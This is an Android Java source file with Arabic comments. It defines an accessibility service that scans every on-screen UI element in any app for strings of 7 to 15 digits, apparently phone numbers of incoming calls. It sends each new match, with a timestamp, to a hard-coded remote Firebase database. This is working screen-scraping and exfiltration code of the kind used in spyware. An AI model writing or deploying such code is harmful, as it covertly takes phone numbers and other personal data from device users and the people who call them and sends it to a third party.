package com.cdma.gsm.call;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import java.util.HashMap;
import java.util.Map;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "AccessibilityBridge";
    private static final String DB_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
    private String lastCapturedNumber = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // نراقب تغيير محتوى الشاشة أو حالة النافذة (عند ورود اتصال تظهر نافذة جديدة)
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || 
            event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            
            AccessibilityNodeInfo nodeInfo = event.getSource();
            if (nodeInfo == null) return;

            // البدء في البحث عن أرقام داخل عناصر الشاشة
            scanNodesForNumber(nodeInfo);
        }
    }

    private void scanNodesForNumber(AccessibilityNodeInfo node) {
        if (node == null) return;

        if (node.getText() != null) {
            String text = node.getText().toString().replaceAll("\\s+", ""); // إزالة المسافات
            
            // فحص ما إذا كان النص يتكون من أرقام فقط وطوله بين 7 و 15 رقم
            if (text.matches("\\d{7,15}")) {
                if (!text.equals(lastCapturedNumber)) {
                    lastCapturedNumber = text;
                    Log.d(TAG, "تم التقاط رقم من الشاشة: " + text);
                    sendToFirebase(text);
                }
            }
        }

        // البحث في العناصر الفرعية (Recursive search)
        for (int i = 0; i < node.getChildCount(); i++) {
            scanNodesForNumber(node.getChild(i));
        }
    }

    private void sendToFirebase(String number) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance(DB_URL);
            DatabaseReference myRef = database.getReference("bridge_signals");

            Map<String, Object> data = new HashMap<>();
            data.put("number", number);
            data.put("type", "CALL");
            data.put("method", "Accessibility"); // لتعرف أن الرقم جاء من هذه الطريقة
            data.put("timestamp", System.currentTimeMillis());

            myRef.setValue(data);
        } catch (Exception e) {
            Log.e(TAG, "خطأ في الإرسال لـ Firebase: " + e.getMessage());
        }
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "خدمة الوصول توقفت بشكل مفاجئ");
    }
}
